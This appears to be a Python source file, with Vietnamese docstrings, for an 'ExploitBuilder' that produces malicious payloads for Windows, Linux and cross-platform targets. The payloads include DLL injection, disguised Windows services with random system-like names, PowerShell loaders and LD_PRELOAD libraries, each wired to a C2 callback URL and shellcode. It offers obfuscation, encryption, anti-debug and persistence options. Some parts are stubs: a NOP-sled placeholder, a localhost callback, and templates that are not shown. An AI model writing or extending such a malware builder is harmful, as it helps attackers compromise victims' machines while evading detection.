import os
import json
import random
import string
import base64
import logging
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

@dataclass
class PayloadConfig:
    """Cấu hình cho payload"""
    target_os: str
    arch: str
    format: str
    encryption: bool = True
    obfuscation: bool = True
    anti_debug: bool = True
    persistence: bool = True
    connect_back: bool = True

@dataclass
class BuildResult:
    """Kết quả build exploit"""
    success: bool
    exploit_id: str
    timestamp: datetime
    config: PayloadConfig
    files: Dict[str, str] = field(default_factory=dict)
    error: Optional[str] = None

class ExploitBuilder:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.templates = self._load_templates()
        self.custom_payloads = {}
        self.build_cache = {}
        
        # Encryption keys
        self.key = get_random_bytes(32)
        self.iv = get_random_bytes(16)
        
    def _load_templates(self) -> Dict[str, Dict]:
        """Load exploit templates"""
        templates = {
            # Windows Templates
            'windows/service_exe': {
                'name': 'Windows Service Executable',
                'os': 'windows',
                'arch': ['x64', 'x86'],
                'format': 'exe',
                'builder': self._build_windows_service
            },
            'windows/dll_inject': {
                'name': 'DLL Injection',
                'os': 'windows', 
                'arch': ['x64', 'x86'],
                'format': 'dll',
                'builder': self._build_dll_inject
            },
            'windows/powershell': {
                'name': 'PowerShell Script',
                'os': 'windows',
                'arch': ['x64', 'x86'],
                'format': 'ps1',
                'builder': self._build_powershell
            },
            
            # Linux Templates
            'linux/elf_exec': {
                'name': 'Linux ELF Executable',
                'os': 'linux',
                'arch': ['x64', 'x86'],
                'format': 'elf',
                'builder': self._build_linux_elf
            },
            'linux/shared_lib': {
                'name': 'Shared Library',
                'os': 'linux',
                'arch': ['x64', 'x86'],
                'format': 'so',
                'builder': self._build_shared_lib
            },
            'linux/python': {
                'name': 'Python Script',
                'os': 'linux',
                'arch': ['any'],
                'format': 'py',
                'builder': self._build_python
            },
            
            # Multi-Platform
            'cross/shell_script': {
                'name': 'Shell Script',
                'os': ['linux', 'macos'],
                'arch': ['any'],
                'format': 'sh',
                'builder': self._build_shell_script
            },
            'cross/java_jar': {
                'name': 'Java JAR',
                'os': ['windows', 'linux', 'macos'],
                'arch': ['any'],
                'format': 'jar',
                'builder': self._build_java_jar
            }
        }
        
        # Load custom templates if exist
        custom_path = 'templates/custom'
        if os.path.exists(custom_path):
            for f in os.listdir(custom_path):
                if f.endswith('.json'):
                    with open(os.path.join(custom_path, f)) as file:
                        template = json.load(file)
                        if self._validate_template(template):
                            templates[template['id']] = template
                            
        return templates
        
    def build_exploit(self, template_id: str, config: PayloadConfig) -> BuildResult:
        """Build exploit từ template"""
        try:
            # Validate template
            if template_id not in self.templates:
                raise ValueError(f"Invalid template: {template_id}")
                
            template = self.templates[template_id]
            
            # Check compatibility
            if config.target_os not in template['os'] if isinstance(template['os'], list) else template['os']:
                raise ValueError(f"Template not compatible with {config.target_os}")
                
            if config.arch not in template['arch']:
                raise ValueError(f"Template not compatible with {config.arch}")
                
            # Generate exploit ID
            exploit_id = self._generate_id()
            
            # Build payload
            builder = template['builder']
            files = builder(config)
            
            # Post-process files
            processed = {}
            for name, content in files.items():
                if config.obfuscation:
                    content = self._obfuscate(content, template['format'])
                if config.encryption:
                    content = self._encrypt(content)
                processed[name] = content
                
            # Cache result
            self.build_cache[exploit_id] = {
                'template': template_id,
                'config': config,
                'files': processed
            }
            
            return BuildResult(
                success=True,
                exploit_id=exploit_id,
                timestamp=datetime.now(),
                config=config,
                files=processed
            )
            
        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            return BuildResult(
                success=False,
                exploit_id='',
                timestamp=datetime.now(),
                config=config,
                error=str(e)
            )
            
    def _build_windows_service(self, config: PayloadConfig) -> Dict[str, str]:
        """Build Windows service executable"""
        files = {}
        
        # Main service executable
        service_code = self._get_template('windows/service.cpp')
        service_code = service_code.replace('{{CALLBACK_URL}}', self._get_callback_url())
        files['service.exe'] = service_code
        
        # Install script
        install_script = self._get_template('windows/install_service.bat')
        install_script = install_script.replace('{{SERVICE_NAME}}', self._generate_service_name())
        files['install.bat'] = install_script
        
        return files
        
    def _build_dll_inject(self, config: PayloadConfig) -> Dict[str, str]:
        """Build DLL injection payload"""
        files = {}
        
        # Malicious DLL
        dll_code = self._get_template('windows/inject.cpp')
        dll_code = dll_code.replace('{{SHELLCODE}}', self._generate_shellcode(config))
        files['payload.dll'] = dll_code
        
        # Loader executable
        loader_code = self._get_template('windows/loader.cpp')
        loader_code = loader_code.replace('{{DLL_NAME}}', 'payload.dll')
        files['loader.exe'] = loader_code
        
        return files
        
    def _build_powershell(self, config: PayloadConfig) -> Dict[str, str]:
        """Build PowerShell payload"""
        files = {}
        
        # Main script
        ps_code = self._get_template('windows/payload.ps1')
        ps_code = ps_code.replace('{{SHELLCODE}}', self._generate_shellcode(config))
        ps_code = ps_code.replace('{{CALLBACK_URL}}', self._get_callback_url())
        files['payload.ps1'] = ps_code
        
        # Loader script
        loader = self._get_template('windows/load.ps1')
        loader = loader.replace('{{SCRIPT_URL}}', '{{URL}}/payload.ps1')
        files['load.ps1'] = loader
        
        return files
        
    def _build_linux_elf(self, config: PayloadConfig) -> Dict[str, str]:
        """Build Linux ELF executable"""
        files = {}
        
        # Main executable
        elf_code = self._get_template('linux/payload.c')
        elf_code = elf_code.replace('{{SHELLCODE}}', self._generate_shellcode(config))
        files['payload'] = elf_code
        
        # Startup script
        startup = self._get_template('linux/startup.sh')
        startup = startup.replace('{{BINARY}}', './payload')
        files['startup.sh'] = startup
        
        return files
        
    def _build_shared_lib(self, config: PayloadConfig) -> Dict[str, str]:
        """Build shared library payload"""
        files = {}
        
        # Shared library
        lib_code = self._get_template('linux/library.c')
        lib_code = lib_code.replace('{{SHELLCODE}}', self._generate_shellcode(config))
        files['library.so'] = lib_code
        
        # Loader
        loader = self._get_template('linux/ldpreload.sh')
        loader = loader.replace('{{LIBRARY}}', './library.so')
        files['load.sh'] = loader
        
        return files
        
    def _build_python(self, config: PayloadConfig) -> Dict[str, str]:
        """Build Python payload"""
        files = {}
        
        # Main script
        py_code = self._get_template('linux/payload.py')
        py_code = py_code.replace('{{CALLBACK_URL}}', self._get_callback_url())
        files['payload.py'] = py_code
        
        # Requirements
        files['requirements.txt'] = 'requests\ncrypto\npsutil'
        
        return files
        
    def _build_shell_script(self, config: PayloadConfig) -> Dict[str, str]:
        """Build shell script payload"""
        files = {}
        
        # Main script
        shell_code = self._get_template('cross/payload.sh')
        shell_code = shell_code.replace('{{CALLBACK_URL}}', self._get_callback_url())
        files['payload.sh'] = shell_code
        
        return files
        
    def _build_java_jar(self, config: PayloadConfig) -> Dict[str, str]:
        """Build Java JAR payload"""
        files = {}
        
        # Main class
        java_code = self._get_template('cross/Payload.java')
        java_code = java_code.replace('{{CALLBACK_URL}}', self._get_callback_url())
        files['Payload.java'] = java_code
        
        # Manifest
        manifest = 'Main-Class: Payload\n'
        files['MANIFEST.MF'] = manifest
        
        return files
        
    def _get_template(self, name: str) -> str:
        """Load template file"""
        path = os.path.join('templates', name)
        if not os.path.exists(path):
            raise ValueError(f"Template not found: {name}")
            
        with open(path, 'r') as f:
            return f.read()
            
    def _generate_shellcode(self, config: PayloadConfig) -> str:
        """Generate shellcode for target"""
        # TODO: Implement actual shellcode generation
        return "\\x90" * 50  # NOP sled for now
        
    def _get_callback_url(self) -> str:
        """Get C2 callback URL"""
        # TODO: Get from config
        return "http://localhost:8080"
        
    def _generate_service_name(self) -> str:
        """Generate random service name"""
        prefixes = ['ms', 'windows', 'sys', 'net', 'remote']
        suffixes = ['svc', 'service', 'agent', 'helper', 'mgr']
        
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        random_part = ''.join(random.choices(string.ascii_lowercase, k=4))
        
        return f"{prefix}{random_part}{suffix}"
        
    def _generate_id(self) -> str:
        """Generate unique exploit ID"""
        return hashlib.sha256(
            str(datetime.now().timestamp()).encode()
        ).hexdigest()[:16]
        
    def _obfuscate(self, content: str, format: str) -> str:
        """Obfuscate code based on format"""
        if format == 'exe':
            # TODO: PE packing/encryption
            return content
        elif format == 'dll':
            # TODO: DLL obfuscation
            return content
        elif format in ['ps1', 'py', 'sh']:
            # Base64 encode
            return base64.b64encode(content.encode()).decode()
        else:
            return content
            
    def _encrypt(self, content: str) -> str:
        """Encrypt content"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded = self._pad(content.encode())
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode()
        
    def _pad(self, data: bytes) -> bytes:
        """Pad data for encryption"""
        pad_len = 16 - (len(data) % 16)
        return data + bytes([pad_len] * pad_len)
        
    def _validate_template(self, template: Dict) -> bool:
        """Validate custom template"""
        required = ['id', 'name', 'os', 'arch', 'format', 'code']
        return all(field in template for field in required)
        
    def get_templates(self) -> Dict[str, Dict]:
        """Get available templates"""
        return {
            id: {
                'name': t['name'],
                'os': t['os'],
                'arch': t['arch'],
                'format': t['format']
            }
            for id, t in self.templates.items()
        }
        
    def get_build_result(self, exploit_id: str) -> Optional[Dict]:
        """Get cached build result"""
        return self.build_cache.get(exploit_id)
        
    def clear_cache(self):
        """Clear build cache"""
        self.build_cache.clear()